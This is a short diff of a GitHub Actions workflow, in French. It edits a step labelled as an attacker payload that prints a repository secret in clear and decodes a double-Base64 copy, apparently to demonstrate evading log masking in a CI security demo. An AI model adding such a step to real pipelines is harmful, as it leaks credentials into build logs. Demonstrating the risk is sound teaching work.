@@ -20,11 +20,11 @@ jobs:
           DEMO_SECRET: ${{ secrets.DEMO_SECRET }}
 
       # Étape malveillante
-      - name: Étape compromise : extraction du secret en clair
+      - name: Étape compromise
         shell: bash
         run: |
           echo ""
-          echo "===== ⚠️ ATTACKER PAYLOAD ACTIVÉ ====="
+          echo "===== ATTACKER PAYLOAD ACTIVÉ ====="
           echo "[Attacker] Lecture de la variable d'environnement..."
           echo "[Attacker] Secret exfiltré en clair : $DEMO_SECRET"
           echo ""
@@ -34,6 +34,6 @@ jobs:
           echo ""
           echo "[Attacker] Décodage du double Base64 :"
           echo "$encoded" | base64 --decode | base64 --decode
-          echo "===== ⚠️ FIN DU PAYLOAD ====="
+          echo "===== FIN DU PAYLOAD ====="
         env:
           DEMO_SECRET: ${{ secrets.DEMO_SECRET }}
